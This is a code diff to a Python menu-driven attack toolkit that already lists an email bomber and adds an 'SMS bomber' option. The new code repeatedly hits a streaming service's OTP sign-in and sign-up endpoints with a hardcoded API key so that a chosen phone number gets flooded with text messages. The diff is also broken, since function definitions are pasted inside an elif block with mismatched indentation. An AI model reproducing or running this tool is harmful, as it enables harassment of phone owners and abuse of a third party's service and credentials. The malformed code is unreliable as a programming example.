@@ -1,8 +1,8 @@
 #################################################--import libraries and install if not installed--#################################################
-import subprocess, platform, urllib.request, random, string, time, sys, os, re, smtplib
+import subprocess, platform, random, string, time, sys, os, re, smtplib
 
 try:
-    import pyfiglet, urllib.request as urllib2, json, pprint, nmap, whois, pyperclip, requests, pyshorteners as ps
+    import pyfiglet, urllib.request as urllib2, json, pprint, nmap, whois, pyperclip, requests as rq, pyshorteners as ps
     from tld import get_tld
 except ModuleNotFoundError:
     print("modules are not installed")
@@ -30,7 +30,8 @@ while ans:
     7. WAF(WEB APP FIREWALL) Detection (NMAP)
     8. Temp Mail
     9. Email Bomber
-    10. Exit/Quit
+    10. SMS Momber
+    11. Exit/Quit
     """)
     ans=input("Choose Your T00l: ") 
     if ans=="1":
@@ -297,11 +298,52 @@ while ans:
             time.sleep(wait)
         print("{} texts were sent. :)".format(text_amount))
         server.quit()
+######################################--SMS BOMBER--################################################# 
     elif ans=="10":
+        import requests as rq
+def send(target):
+  header = {
+    "x-api-key": "dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3"
+  }
+  data = {
+    "requestType":"send",
+    "phoneNumber":"+88"+target,
+    "screenName":"signin"
+  }
+  url = "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-44067eab-5337-99d8-11eb-99ca1e4db186"
+  res = rq.post(url, json=data, headers=header)
+  if res.json().get("code"):
+    data = {
+      "requestType":"send",
+      "phoneNumber":"+447551422563",
+      "emailConsent":"true",
+      "whatsappConsent":"true",
+      "email":"cicas94417@iconmle.com"
+    }
+    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
+    res = rq.post(url, json=data, headers=header)
+    if not res.json().get("sent"): return False
+  return True
+def main():
+  target = input("[*] Target Number: ")
+  amount = int(input("[*] Total Amount of SMS to send: "))
+  sent, nsent = 0, amount
+  for i in range(1, amount + 1):
+    try:
+      if send(target):
+        print(f"[ID: {i}] SMS Sent!")
+        sent += 1
+        nsent -= 1
+      else:
+        print(f"[ID: {i}] SMS Not Sent...")
+    except KeyboardInterrupt: break
+    except Exception as e: print(e); break
+  print(f"\n[*] Total Target: {amount}\n[+] Sent: {sent}\n[-] Not Sent: {nsent}")
+
+if __name__ == "__main__":
+  main()
+    elif ans=="11":
 ######################################--EXIT--#################################################
         exit()
-    elif ans=="99":
-######################################-- WHATS MY IP?--#################################################
-        os.system("curl ipinfo.io")
     elif ans !="":
         print("\n Not A Valid Choice Try again") 
